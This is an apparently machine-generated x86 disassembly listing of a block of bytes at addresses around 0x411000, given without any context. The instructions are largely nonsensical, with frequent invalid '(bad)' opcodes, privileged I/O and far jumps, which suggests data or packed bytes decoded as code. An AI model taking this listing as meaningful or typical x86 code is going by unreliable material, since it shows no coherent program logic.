  4110da:	les    edi,FWORD PTR [eax]
  4110dc:	popa   
  4110dd:	pop    ecx
  4110de:	or     dl,al
  4110e0:	push   ebx
  4110e1:	push   ds
  4110e2:	xlat   BYTE PTR ds:[ebx]
  4110e3:	aas    
  4110e4:	xor    al,0x75
  4110e6:	fimul  DWORD PTR [edi+0x5085a500]
  4110ec:	push   esi
  4110ed:	jle    0x411123
  4110ef:	leave  
  4110f0:	and    cl,bl
  4110f2:	js     0x411134
  4110f4:	add    al,0x94
  4110f6:	retf   0x157a
  4110f9:	jl     0x411143
  4110fb:	pop    ds
  4110fc:	cli    
  4110fd:	daa    
  4110fe:	sbb    al,0x95
  411100:	retf   0x918a
  411103:	jb     0x41112f
  411105:	js     0x411171
  411107:	sub    esp,ebp
  411109:	cmp    al,0x71
  41110b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41110c:	xor    cl,bl
  41110e:	xchg   BYTE PTR [esi-0x37],ah
  411111:	jl     0x41111a
  411113:	sti    
  411114:	(bad)  
  411115:	mov    eax,es:0x64960a3c
  41111b:	arpl   sp,ax
  41111d:	addr16 jnp 0x411180
  411120:	mov    DWORD PTR [edi-0x6],esp
  411123:	(bad)  
  411125:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411126:	gs jnp 0x41115e
  411129:	sbb    eax,0xac6244ff
  41112e:	fst    QWORD PTR [eax-0x76aa065a]
  411134:	data16 jmp 0x4110ff
  411137:	lahf   
  411138:	loope  0x41112f
  41113a:	ret    
  41113b:	mov    ch,dh
  41113d:	dec    ebx
  41113e:	fld    QWORD PTR [eax-0x1b]
  411141:	nop
  411142:	aam    0xa1
  411144:	out    0xc1,eax
  411146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411147:	sar    BYTE PTR [ecx+0x243a6394],1
  41114d:	and    eax,0x4c0f5847
  411152:	(bad)  
  411153:	retf   
  411154:	les    ebx,FWORD PTR [ebp-0x5]
  411157:	jg     0x41115d
  411159:	add    BYTE PTR [edx-0x65],ch
  41115c:	hlt    
  41115d:	scas   al,BYTE PTR es:[edi]
  41115e:	stc    
  41115f:	xchg   ebp,eax
  411160:	idiv   DWORD PTR [ebx+0x1d13dfde]
  411166:	push   ss
  411167:	popf   
  411168:	iret   
  411169:	cmp    DWORD PTR [edi],esp
  41116b:	into   
  41116c:	add    eax,0x1629b234
  411171:	push   edi
  411172:	add    al,0xfd
  411174:	ss adc eax,0x1e83a57b
  41117b:	out    dx,al
  41117c:	mov    ebp,0x446d9fb3
  411181:	add    ebp,DWORD PTR [esi+0x52]
  411184:	push   edx
  411185:	push   0x2148a239
  41118a:	dec    ebx
  41118b:	std    
  41118c:	call   0x15d1:0xabc9f94
  411193:	sbb    DWORD PTR [edx+0x35b92aa8],ebp
  411199:	and    BYTE PTR [eax+eax*1+0x46edbb46],ch
  4111a0:	in     al,0x7b
  4111a2:	and    DWORD PTR [edx+0x64db1433],ebx
  4111a8:	xchg   DWORD PTR [ebx+0x788c6b6b],ecx
  4111ae:	cmp    eax,DWORD PTR [edx]
  4111b0:	ror    DWORD PTR [eax+0x0],cl
  4111b3:	push   edi
  4111b4:	xchg   esi,eax
  4111b5:	jecxz  0x4111cf
  4111b7:	test   eax,0x439a380b
  4111bc:	sub    ah,BYTE PTR [esi+0x24b4684f]
  4111c2:	lock mov esp,edi
  4111c5:	cwde   
  4111c6:	inc    ebp
  4111c7:	dec    eax
  4111c8:	and    BYTE PTR ds:0x3ad3da3d,bh
  4111ce:	mov    al,0x4b
  4111d0:	retf   
  4111d1:	lods   al,BYTE PTR ds:[esi]
  4111d2:	pop    esp
  4111d3:	pop    ebp
  4111d4:	mov    dh,0xf6
  4111d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111d7:	lds    ebp,FWORD PTR [edx+0x622c9b8d]
  4111dd:	push   esp
  4111de:	pop    es
  4111df:	in     al,0x79
  4111e1:	push   ecx
  4111e2:	push   es
  4111e3:	push   cs
  4111e4:	add    BYTE PTR ds:0x2dedd568,bl
  4111ea:	mov    dl,0xbf
  4111ec:	xchg   esp,eax
  4111ed:	pop    edi
  4111ee:	scas   eax,DWORD PTR es:[edi]
  4111ef:	cmp    eax,esi
  4111f1:	push   ebx
  4111f2:	and    bl,dl
  4111f4:	dec    esi
  4111f5:	cmp    DWORD PTR [ebp+0x10947184],edx
  4111fb:	dec    ebp
  4111fc:	jecxz  0x411189
  4111fe:	adc    eax,0x4814c39b
  411203:	add    BYTE PTR [ebp+eax*4+0x7d],ah
  411207:	mov    bl,0xdc
  411209:	popf   
  41120a:	xlat   BYTE PTR ds:[ebx]
  41120b:	mov    ebp,0xa761db38
  411210:	add    eax,0x8b5de241
  411215:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411216:	jmp    0x222646c2
  41121b:	and    DWORD PTR [ebx+0x1c],ebp
  41121e:	lock ja 0x41123c
  411221:	pop    DWORD PTR [esp+eiz*2-0x274742c5]
  411228:	and    BYTE PTR [ecx-0x714d9ae6],0xeb
  41122f:	xor    eax,0xf18ce883
  411234:	lods   eax,DWORD PTR ds:[esi]
  411235:	mov    esp,DWORD PTR [ebx]
  411237:	xor    edx,DWORD PTR [eax]
  411239:	jp     0x411215
  41123b:	dec    eax
  41123c:	jg     0x41121c
  41123e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41123f:	sub    BYTE PTR [esi+edx*1-0x4e],0x51
  411244:	dec    ebp
  411245:	rol    BYTE PTR [eax],cl
  411247:	pop    ecx
  411248:	xchg   esi,eax
  411249:	in     eax,dx
  41124a:	or     eax,0x7f8b52e
  41124f:	inc    ecx
  411250:	jmp    0x951f:0x809f7ae5
  411257:	ja     0x4111f4
  411259:	mov    ds:0xe547d7e7,al
  41125e:	jecxz  0x4112ac
  411260:	mov    cl,0x44
  411262:	sub    eax,0x1826a5ea
  411267:	jnp    0x4112ad
  411269:	test   bh,ah
  41126b:	aad    0xaf
  41126d:	mov    DWORD PTR [ebx+esi*1],edx
  411270:	sub    BYTE PTR [ecx+0x5],ch
  411273:	jns    0x41126b
  411275:	(bad)  
  411276:	not    BYTE PTR [esi+0x1fc9f13b]
  41127c:	jmp    0x9585bc5d
  411281:	cwde   
  411282:	dec    edi
  411283:	(bad)  
  411284:	pushf  
  411285:	pushf  
  411286:	mov    ah,0x44
  411288:	test   DWORD PTR [ebx],eax
  41128a:	inc    esp
  41128b:	xor    bh,BYTE PTR [ebx+0x71]
  41128e:	pop    esp
  41128f:	repnz dec esi
  411291:	pop    ebx
  411292:	lea    edi,[edi+0x77e67760]
  411298:	sub    al,0xd6
  41129a:	fistp  DWORD PTR [edx-0x36aaa5fc]
  4112a0:	inc    ebp
  4112a1:	retf   0xef93
  4112a4:	jmp    0x411321
  4112a6:	cmc    
  4112a7:	popa   
  4112a8:	jae    0x4112fe
  4112aa:	mov    WORD PTR [edi+0x6c],?
  4112ad:	das    
  4112ae:	and    BYTE PTR [edi+0x6],ch
  4112b1:	adc    ebx,eax
  4112b3:	mov    bl,0x18
  4112b5:	sub    DWORD PTR [esi],edx
  4112b7:	stc    
  4112b8:	pop    ecx
  4112b9:	aaa    
  4112ba:	cmp    DWORD PTR [edx+ebx*1+0x3f7e37cc],0xffffffd7
  4112c2:	clc    
  4112c3:	xor    DWORD PTR [ebx*4+0x5e6c1077],eax
  4112ca:	cwde   
  4112cb:	jecxz  0x411257
  4112cd:	clc    
  4112ce:	jle    0x4112b3
  4112d0:	in     al,0x46
  4112d2:	sub    DWORD PTR [ebx+0x5f],ebx
  4112d5:	es xor eax,0x4d1223a7
  4112db:	or     al,0xbe
  4112dd:	xchg   edi,eax
  4112de:	pop    edi
  4112df:	mov    bh,0x4b
  4112e1:	mov    ds:0x1163dcd0,eax
  4112e6:	or     eax,0x9ebef170
  4112eb:	das    
  4112ec:	mov    dl,0xc3
  4112ee:	lods   al,BYTE PTR ds:[esi]
  4112ef:	(bad)  
  4112f0:	ja     0x411363
  4112f2:	add    dh,BYTE PTR fs:[ebx+0x20a04428]
  4112f9:	xchg   DWORD PTR ds:0xa57f21da,ecx
  4112ff:	mov    ch,0xf1
  411301:	fwait
  411302:	leave  
  411303:	sub    edx,0xc274082b
  411309:	and    al,0x62
  41130b:	push   ebp
  41130c:	iret   
  41130d:	fnstsw WORD PTR [ebx-0x72]
  411310:	cmp    DWORD PTR [edx+0x24],ebx
  411313:	jmp    0xec031a88
  411318:	xor    al,0x39
  41131a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41131b:	jo     0x411396
  41131d:	popf   
  41131e:	push   esp
  41131f:	xlat   BYTE PTR ds:[ebx]
  411320:	sub    al,0x83
  411322:	and    eax,0x481dac4b
  411327:	daa    
  411328:	cs dec esp
  41132a:	shl    DWORD PTR [ecx-0x4f],cl
  41132d:	sub    ah,BYTE PTR [ecx-0x28]
  411330:	les    ebx,FWORD PTR [edx+ebx*4]
  411333:	mov    al,0x5f
  411335:	mov    ss,WORD PTR [ebx+0x4ef0e0b7]
  41133b:	sub    ah,BYTE PTR [eax-0x4eed00c5]
  411341:	sbb    ch,BYTE PTR [ebp+0x2f38db23]
  411347:	sub    bh,al
  411349:	xor    al,0x8
  41134b:	pop    edx
  41134c:	adc    eax,0x9037a1d6
  411351:	push   0xffffffd8
  411353:	fdiv   st(7),st
  411355:	and    edi,esp
  411357:	lods   al,BYTE PTR ds:[esi]
  411358:	xchg   esp,eax
  411359:	pushf  
  41135a:	popf   
  41135b:	adc    DWORD PTR [ebx],0x67688f39
  411361:	fidiv  DWORD PTR [ebx+0x23]
  411364:	mov    WORD PTR [eax],fs
  411366:	lds    ecx,FWORD PTR [edx+eax*1-0x78f61df9]
  41136d:	xchg   bl,cl
  41136f:	fcmove st,st(4)
  411371:	lock and BYTE PTR [ebx+0x3f],bh
  411375:	cmp    DWORD PTR [ecx-0x72],esp
  411378:	and    ebp,edx
  41137a:	adc    ebx,DWORD PTR [edx+edx*8]
  41137d:	cmp    ch,BYTE PTR ds:0xa3e4a66
  411383:	int    0x92
  411385:	aad    0x77
  411387:	or     eax,DWORD PTR [ecx-0x3f1963e]
  41138d:	dec    esi
  41138e:	sti    
  41138f:	(bad)  
  411391:	and    edx,DWORD PTR [ecx+edi*8]
  411394:	push   esp
  411395:	pop    ebx
  411396:	cmp    ch,BYTE PTR [esi+ebx*8+0x6d]
  41139a:	jns    0x411376
  41139c:	mov    al,0x43
  41139e:	scas   eax,DWORD PTR es:[edi]
  41139f:	jmp    0x1a941ce4
  4113a4:	aam    0xd6
  4113a6:	sbb    esi,DWORD PTR [ebp+0x62]
  4113a9:	imul   edx,DWORD PTR [edi],0xffffffc6
  4113ac:	(bad)  
  4113ad:	mov    eax,ds:0x620d7ead
  4113b2:	inc    edi
  4113b3:	cmp    eax,0x7af81ffe
  4113b8:	jno    0x411377
  4113ba:	aaa    
  4113bb:	rcr    DWORD PTR [esi-0x60116b4c],1
  4113c1:	imul   ebp,edx,0x8cf6dae
  4113c7:	in     al,0x93
  4113c9:	mov    ecx,0xa3767e18
  4113ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4113cf:	sub    al,0x4
  4113d1:	xor    DWORD PTR [ebx+0x2c],edx
  4113d4:	adc    eax,0xda768e7f
  4113d9:	xchg   edx,eax
  4113da:	or     ebx,0xb9c39de8
  4113e0:	int    0xc2
  4113e2:	push   edx
  4113e3:	jecxz  0x411399
  4113e5:	(bad)  
  4113e6:	push   edi
  4113e7:	cld    
  4113e8:	test   eax,0x9f9a7f3b
  4113ed:	outs   dx,BYTE PTR ds:[esi]
  4113ee:	pushf  
  4113ef:	jne    0x411445
  4113f1:	sub    bh,bh
  4113f3:	xor    ch,BYTE PTR [ebp-0x3130b514]
  4113f9:	shr    WORD PTR [edx+0xe],0x3c
  4113fe:	inc    eax
  4113ff:	or     edx,DWORD PTR [eax+ebx*2-0x5f]
  411403:	or     DWORD PTR [ebx],ebp
  411405:	mov    edi,0x92b2db5a
  41140a:	or     ch,dl
  41140c:	sub    dl,BYTE PTR [ebp+0x11]
  41140f:	sub    al,0x6e
  411411:	cmp    al,0x43
  411413:	nop
  411414:	les    edx,FWORD PTR [esi+0x46]
  411417:	push   0x5c383319
  41141c:	data16 mov dh,0x29
  41141f:	pop    ss
  411420:	cmp    dl,ch
  411422:	arpl   si,si
  411424:	add    ebp,DWORD PTR [edx+edi*1+0x794140c]
  41142b:	lods   eax,DWORD PTR ds:[esi]
  41142c:	out    dx,eax
  41142d:	xchg   esp,eax
  41142e:	and    ecx,DWORD PTR [ebp-0x4c]
  411431:	push   ss
  411432:	ficom  DWORD PTR [edx]
  411434:	pop    ss
  411435:	dec    edx
  411436:	xchg   esi,eax
  411437:	jb     0x411442
  411439:	imul   esp,DWORD PTR [eax],0xdd936515
  41143f:	int3   
  411440:	int    0x82
  411442:	sub    BYTE PTR [ebx-0x62],bl
  411445:	dec    esp
  411446:	cli    
  411447:	inc    ebp
  411448:	xor    eax,0x82f179e
  41144d:	test   DWORD PTR [edx-0x705ccd27],esp
  411453:	ret    
  411454:	cmp    al,0x90
  411456:	aas    
  411457:	iret   
  411458:	shr    BYTE PTR [edx-0x78af2cd7],0x2e
  41145f:	stos   DWORD PTR es:[edi],eax
  411460:	mov    edx,0xcb4c3c68
  411465:	jmp    edi
  411467:	fwait
  411468:	jle    0x4114c3
  41146a:	jo     0x41146b
  41146c:	pcmpeqw mm1,QWORD PTR ds:0xa0e20b82
  411473:	mov    BYTE PTR [ebp+0x41479b89],0x53
  41147a:	js     0x4114d0
  41147c:	sub    esp,esi
  41147e:	or     ecx,DWORD PTR [ebp+0x1d]
  411481:	inc    ebp
  411482:	sub    eax,0xac667251
  411487:	into   
  411488:	mov    al,0x26
  41148a:	sbb    DWORD PTR [edx],ecx
  41148c:	add    cl,BYTE PTR ds:0xbc83964c
  411492:	mov    ecx,0x15a7943d
  411497:	push   ds
  411498:	and    edx,DWORD PTR [edx]
  41149a:	aam    0xe2
  41149c:	dec    esp
  41149d:	pop    eax
  41149e:	loope  0x411458
  4114a0:	push   esi
  4114a1:	or     eax,0x2f5cb6dd
  4114a6:	and    bl,BYTE PTR [edx]
  4114a8:	scas   eax,DWORD PTR es:[edi]
  4114a9:	ficomp WORD PTR [ebx]
  4114ab:	call   0x865a0d93
  4114b0:	adc    esi,DWORD PTR [edx]
  4114b2:	and    eax,0x73883ffe
  4114b7:	imul   edx,DWORD PTR [esi-0x11f30855],0x6b85084f
  4114c1:	popf   
  4114c2:	push   ecx
  4114c3:	cdq    
  4114c4:	je     0x411542
  4114c6:	add    DWORD PTR [eax-0x12],ebp
  4114c9:	xchg   BYTE PTR [ebx],dl
  4114cb:	jecxz  0x411497
  4114cd:	aas    
  4114ce:	xchg   ecx,eax
  4114cf:	xchg   DWORD PTR [edx-0x674ce04c],esp
  4114d5:	inc    ecx
  4114d6:	dec    edx
  4114d7:	cmovs  esi,DWORD PTR [ecx+0x57]
  4114db:	pop    ebx
  4114dc:	enter  0xf7a3,0x67
  4114e0:	and    eax,0x3846a7b5
  4114e5:	push   eax
  4114e6:	inc    ebp
  4114e7:	test   al,0x61
  4114e9:	inc    ecx
  4114ea:	(bad)  
  4114eb:	std    
  4114ec:	adc    DWORD PTR [ecx-0x3c5a6ea2],ecx
  4114f2:	outs   dx,DWORD PTR ds:[esi]
  4114f3:	xor    DWORD PTR [esi-0x23],ecx
  4114f6:	lock or eax,0xf6a5539e
  4114fc:	pop    esi
  4114fd:	mov    eax,0x23b5724d
  411502:	add    al,0xfa
  411504:	add    DWORD PTR [ebp+0xb],esi
  411507:	push   0xb2d24df6
  41150c:	pop    esp
  41150d:	(bad)  
  41150e:	xlat   BYTE PTR ds:[ebx]
  41150f:	sbb    ecx,DWORD PTR [ecx]
  411511:	jmp    0xda21:0xcce05f2b
  411518:	cmp    BYTE PTR [ecx-0x62409ca1],ah
  41151e:	push   0x41
  411520:	fild   WORD PTR [edi-0x6]
  411523:	in     eax,dx
  411524:	cli    
  411525:	bound  ebx,QWORD PTR [ebp+eiz*8-0x2]
  411529:	pop    ds
  41152a:	enter  0xa163,0x81
  41152e:	or     DWORD PTR [eax-0x36],edx
  411531:	xchg   DWORD PTR [ecx-0x28],ebx
  411534:	jb     0x41159c
  411536:	cmp    ecx,DWORD PTR [eax+0xe]
  411539:	or     al,0x15
  41153b:	jmp    0xbcf63b38
  411540:	push   ebp
  411541:	mov    cl,0x11
  411543:	or     DWORD PTR [esi+0x58],eax
  411546:	(bad)  
  411547:	rcr    BYTE PTR [edx-0x78],cl
  41154a:	pop    edx
  41154b:	sub    al,0x55
  41154d:	push   0xcdc70efa
  411552:	fstp   TBYTE PTR [edx+0x3]
  411555:	popf   
  411556:	retf   
  411557:	push   esp
  411558:	or     DWORD PTR ds:0x11097e8b,esp
  41155e:	hlt    
  41155f:	pushf  
  411560:	mov    al,ds:0xe9ce3ed
  411565:	lods   eax,DWORD PTR ds:[esi]
  411566:	es loopne 0x41151f
  411569:	ret    
  41156a:	imul   edi,DWORD PTR [eax+esi*8+0x6f],0x67e40ccd
  411572:	push   0x798a1ad6
  411577:	inc    edi
  411578:	jg     0x411506
  41157a:	or     eax,0x175edf2b
  41157f:	mov    BYTE PTR [eax-0x12],dh
  411582:	in     eax,dx
  411583:	xchg   ecx,eax
  411584:	and    al,0xb8
  411586:	xchg   esp,eax
  411587:	ins    DWORD PTR es:[edi],dx
  411588:	gs pop ss
  41158a:	sub    DWORD PTR [ecx-0x3e],esp
  41158d:	mul    DWORD PTR [ebp+0x61620b51]
  411593:	das    
  411594:	jb     0x41154c
  411596:	xchg   ebx,eax
  411597:	jmp    0x84fc:0x83cf908f
  41159e:	adc    BYTE PTR [ecx+0x74],0xde
  4115a2:	jle    0x4115a0
  4115a4:	inc    ebp
  4115a5:	cli    
  4115a6:	jl     0x41156e
  4115a8:	loop   0x411572
  4115aa:	xchg   ebx,eax
  4115ab:	push   0x3f955f24
  4115b0:	in     al,dx
  4115b1:	ins    BYTE PTR es:[edi],dx
  4115b2:	xor    al,0xb2
  4115b4:	outs   dx,DWORD PTR ds:[esi]
  4115b5:	hlt    
  4115b6:	mov    dh,0x54
  4115b8:	inc    esp
  4115b9:	out    0x3b,al
  4115bb:	and    DWORD PTR [ebp-0x24d790b8],edi
  4115c1:	mov    ds:0xe474bc6a,al
  4115c6:	mov    ah,0x32
  4115c8:	rcr    BYTE PTR [ebx-0x15f910d],0xfe
  4115cf:	sbb    eax,0x76243473
  4115d4:	pop    ds
  4115d5:	aad    0x94
  4115d7:	sub    DWORD PTR ds:0xcd27f31,eax
  4115dd:	sbb    eax,0xe87818dc
  4115e2:	(bad)  
  4115e3:	ja     0x411575
  4115e5:	dec    edx
  4115e6:	pop    edi
  4115e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4115e8:	pop    esp
  4115e9:	dec    edx
  4115ea:	ins    BYTE PTR es:[edi],dx
  4115eb:	mov    dl,0x39
  4115ed:	and    eax,eax
  4115ef:	cwde   
  4115f0:	pop    edx
  4115f1:	fidiv  DWORD PTR [ebp-0x16]
  4115f4:	push   es
  4115f5:	out    dx,eax
  4115f6:	mov    ecx,DWORD PTR [ebx]
  4115f8:	ret    0x5cf3
  4115fb:	inc    edi
  4115fc:	xchg   esi,eax
  4115fd:	push   ds
  4115fe:	bound  ecx,QWORD PTR [eax]
  411600:	mov    dl,0x35
  411602:	out    dx,al
  411603:	lods   al,BYTE PTR ds:[esi]
  411604:	hlt    
  411605:	ret    0xa927
  411608:	shr    DWORD PTR [esi+0x4c],1
  41160b:	adc    edi,0xffffffb7
  41160e:	mov    al,0x2c
  411610:	shl    BYTE PTR [ebx+0x6d],1
  411613:	adc    DWORD PTR [ecx+0x33ebf426],ebp
  411619:	push   0xa21436c7
  41161e:	retf   0x61ba
  411621:	jne    0x4115d5
  411623:	push   ebx
  411624:	(bad)  [ecx-0x2ae78e36]
  41162a:	jns    0x4115c6
  41162c:	lock out dx,eax
  41162e:	inc    edx
  41162f:	sbb    edi,DWORD PTR [esi+ecx*1+0x28e86841]
  411636:	mov    cl,0x86
  411638:	xchg   esi,eax
  411639:	pop    ebx
  41163a:	add    eax,0x8e581932
  41163f:	call   0x823ded32
  411644:	loopne 0x411683
  411646:	test   DWORD PTR [eax-0x4f],ebp
  411649:	test   DWORD PTR [ebp-0x4e],0x8b253d72
  411650:	xchg   ebp,eax
  411651:	inc    esi
  411652:	mov    edx,0xef642c5d
  411657:	cmp    BYTE PTR [edi-0x54],ch
  41165a:	rcr    DWORD PTR [ecx-0x7f],cl
  41165d:	lods   eax,DWORD PTR ds:[esi]
  41165e:	test   eax,0xbefe1069
  411663:	stc    
  411664:	ins    BYTE PTR es:[edi],dx
  411665:	leave  
  411666:	enter  0x1bbc,0x31
  41166a:	or     dh,bh
  41166c:	sub    dl,BYTE PTR [eax]
  41166e:	pusha  
  41166f:	and    ecx,DWORD PTR [esi]
  411671:	pop    eax
  411672:	cld    
  411673:	mov    dh,0x38
  411675:	mov    BYTE PTR [esi],ch
  411677:	jmp    0x4a55d031
  41167c:	mov    fs,WORD PTR [ecx-0x4b]
  41167f:	adc    DWORD PTR [esi+ecx*8],0xa2d9b4db
  411686:	repnz xor ebp,ebx
  411689:	enter  0xf24d,0x6d
  41168d:	mov    ?,WORD PTR [ecx-0x1bb1a84b]
  411693:	retf   
  411694:	lods   eax,DWORD PTR ds:[esi]
  411695:	jae    0x4116f3
  411697:	sbb    al,ch
  411699:	inc    esp
  41169a:	push   edi
  41169b:	(bad)  
  41169c:	addr16 cmp eax,0xd1872ab
  4116a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a3:	imul   edi,DWORD PTR [ebp+esi*2-0x78f1c2ef],0xaf9892e7
  4116ae:	aam    0x58
  4116b0:	in     al,dx
  4116b1:	ret    0xbc96
  4116b4:	scas   eax,DWORD PTR es:[edi]
  4116b5:	sub    edx,DWORD PTR [ecx]
  4116b7:	inc    esi
  4116b8:	fwait
  4116b9:	mov    ah,0x1
  4116bb:	mov    DWORD PTR [edx],0x2143a85d
  4116c1:	outs   dx,DWORD PTR ds:[esi]
  4116c2:	aaa    
  4116c3:	sub    al,0x11
  4116c5:	jno    0x4116c4
  4116c7:	push   eax
  4116c8:	adc    al,0x44
  4116ca:	js     0x4116af
  4116cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116cd:	adc    cl,BYTE PTR [ebp-0xed35f61]
  4116d3:	aam    0x18
  4116d5:	inc    esp
  4116d6:	lods   al,BYTE PTR ds:[esi]
  4116d7:	mov    WORD PTR [edx+edx*8+0x6ae93463],gs
  4116de:	sub    BYTE PTR [edi],0xc7
  4116e1:	mov    eax,0xb012f897
  4116e6:	add    esp,esp
  4116e8:	or     DWORD PTR gs:[edx+0x4],ecx
  4116ec:	inc    ecx
  4116ed:	push   0xcf894ab6
  4116f2:	cli    
  4116f3:	mov    WORD PTR [edi-0x6],fs
  4116f6:	adc    al,BYTE PTR [esi]
  4116f8:	aam    0x57
  4116fa:	lock mov cl,0xf7
  4116fd:	retf   0x5667
  411700:	xchg   ebx,eax
  411701:	in     eax,0x1c
  411703:	ins    BYTE PTR es:[edi],dx
  411704:	call   0x96cc0d9d
  411709:	fstp   st(0)
  41170b:	pop    ebp
  41170c:	scas   al,BYTE PTR es:[edi]
  41170d:	dec    eax
  41170e:	mov    edi,0xde739cf1
  411713:	(bad)  
  411714:	loopne 0x4116b1
  411716:	xor    cl,cl
  411718:	cvtps2pi mm5,QWORD PTR [ebp+0x58]
  41171c:	es pop ss
  41171e:	push   cs
  41171f:	inc    esi
  411720:	mov    edx,0xf618976b
  411725:	sbb    BYTE PTR [ecx+0x72],bh
  411728:	lds    ebx,FWORD PTR [ebp-0x4b]
  41172b:	stc    
  41172c:	outs   dx,BYTE PTR ds:[esi]
  41172d:	sub    al,0xb8
  41172f:	xchg   edi,eax
  411730:	sub    DWORD PTR [ebp+ebp*8+0x4a8c4f38],ecx
  411737:	lods   al,BYTE PTR ds:[esi]
  411738:	lds    edi,FWORD PTR [ebp-0x22]
  41173b:	std    
  41173c:	int3   
  41173d:	mov    edi,0x4f7f1a31
  411742:	pop    eax
  411743:	mov    edi,ebp
  411745:	aas    
  411746:	cmp    eax,0x7cc840ac
  41174b:	jne    0x41177f
  41174d:	push   DWORD PTR [edi-0x7be8425a]
  411753:	jo     0x4116eb
  411755:	lds    eax,FWORD PTR [esi]
  411757:	and    esi,DWORD PTR [ebx-0x1eac9773]
  41175d:	adc    BYTE PTR [ebp+0x749f05af],bl
  411763:	sub    al,0xa2
  411765:	and    BYTE PTR [esi+0x27],0x83
  411769:	and    bh,al
  41176b:	sbb    eax,0x71ecd197
  411770:	adc    al,0x29
  411772:	std    
  411773:	mov    fs,WORD PTR [edi+esi*2]
  411776:	push   ss
  411777:	mov    dh,0x81
  411779:	ss (bad) 
  41177c:	mov    ebx,0xd489a8f2
  411781:	cmp    esp,edx
  411783:	sahf   
  411784:	hlt    
  411785:	pop    esp
  411786:	inc    eax
  411787:	cmp    DWORD PTR [ecx+0xfbf7a5a],esp
  41178d:	int    0x6b
  41178f:	sub    dl,BYTE PTR [eax]
  411791:	stc    
  411792:	out    dx,eax
  411793:	jecxz  0x4117a9
  411795:	push   0xffffffc9
  411797:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  411799:	jae    0x41173a
  41179b:	rol    BYTE PTR [ebx],0x89
  41179e:	ins    DWORD PTR es:[edi],dx
  41179f:	sbb    al,0x4a
  4117a1:	xchg   edi,eax
  4117a2:	adc    esi,DWORD PTR [eax]
  4117a4:	push   ecx
  4117a5:	cmp    DWORD PTR [esi+edi*8-0x20],0x9a3a3d4
  4117ad:	dec    ebx
  4117ae:	lds    edx,FWORD PTR [edi+0x2c260f11]
  4117b4:	cmp    DWORD PTR [esi+0x74],ecx
  4117b7:	xor    al,0x5
  4117b9:	int    0x0
  4117bb:	mov    dl,0xc8
  4117bd:	es adc al,bh
  4117c0:	shl    BYTE PTR [ebx+0x5f],1
  4117c3:	in     eax,0xfb
  4117c5:	mov    cl,0xe0
  4117c7:	jmp    0x489c:0x25cda8ff
  4117ce:	lahf   
  4117cf:	outs   dx,DWORD PTR ds:[esi]
  4117d0:	jecxz  0x411805
  4117d2:	aas    
  4117d3:	jne    0x411803
  4117d5:	push   0xffffffad
  4117d7:	add    cl,BYTE PTR [bx+di]
  4117da:	ficom  WORD PTR [edx-0x543611d6]
  4117e0:	push   0xffffffb8
  4117e2:	js     0x4117b7
  4117e4:	xchg   edx,eax
  4117e5:	cmp    al,0x7b
  4117e7:	sbb    bl,BYTE PTR [ebp+0x49]
  4117ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117eb:	mov    edi,0xa6df1f2c
  4117f0:	rcl    DWORD PTR [eax+0x29],0xcc
  4117f4:	cwde   
  4117f5:	cmp    DWORD PTR [esi+0x33904aeb],ebp
  4117fb:	mov    bh,0xfe
  4117fd:	leave  
  4117fe:	(bad)  
  4117ff:	(bad)  
  411800:	pop    ds
  411801:	into   
  411802:	adc    edi,DWORD PTR [edi+ebp*4]
  411805:	hlt    
  411806:	mov    ebp,0xc7db0bc9
  41180b:	inc    edi
  41180c:	or     DWORD PTR [ebp+ebp*2-0x4a49bb47],esp
  411813:	mov    cl,dl
  411815:	push   es
  411816:	jne    0x411895
  411818:	or     esi,esp
  41181a:	idiv   dh
  41181c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41181d:	ret    
  41181e:	xor    eax,0x7f442d52
  411823:	mov    ds:0xbe6c5527,eax
  411828:	push   0x1ebaa0ae
  41182d:	stc    
  41182e:	dec    eax
  41182f:	mov    di,0x2b84
  411833:	dec    edx
  411834:	in     al,0xb
  411836:	fcom   DWORD PTR [ebx+0x3c]
  411839:	in     al,dx
  41183a:	jae    0x4118ba
  41183c:	and    DWORD PTR [ebp+0xb],0x43
  411840:	imul   ecx,esi,0xb0025e0f
  411846:	xor    BYTE PTR [ebx],0xdb
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xdd2aba54
  411868:	or     al,0xd0
  41186a:	hlt    
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x22]
  411873:	popw   ss
  411875:	and    eax,0x4f2ce420
  41187a:	(bad)  
  41187b:	ins    BYTE PTR es:[edi],dx
  41187c:	retf   
  41187d:	adc    dl,dh
  41187f:	mov    bl,0x84
  411881:	pop    es
  411882:	jns    0x411806
  411884:	or     DWORD PTR [eax+edi*4-0x61],ebx
  411888:	repz es push ecx
  41188b:	xor    eax,0xab29c3f2
  411890:	mov    ds:0xb6b4549b,al
  411895:	call   0x77dd1dc0
  41189a:	call   0xe2041114
  41189f:	jle    0x41183d
  4118a1:	sub    esi,DWORD PTR [eax+0xd]
  4118a4:	icebp  
  4118a5:	test   DWORD PTR [edx+0x70deb56f],ebx
  4118ab:	lock dec edx
  4118ad:	int    0xbf
  4118af:	sub    al,bh
  4118b1:	comiss xmm2,DWORD PTR [edx-0x38dac674]
  4118b8:	cdq    
  4118b9:	fld    DWORD PTR [esi-0x19]
  4118bc:	jno    0x411876
  4118be:	pop    edx
  4118bf:	add    al,0xf8
  4118c1:	inc    eax
  4118c2:	(bad)  
  4118c3:	and    al,0xb8
  4118c5:	pop    ebp
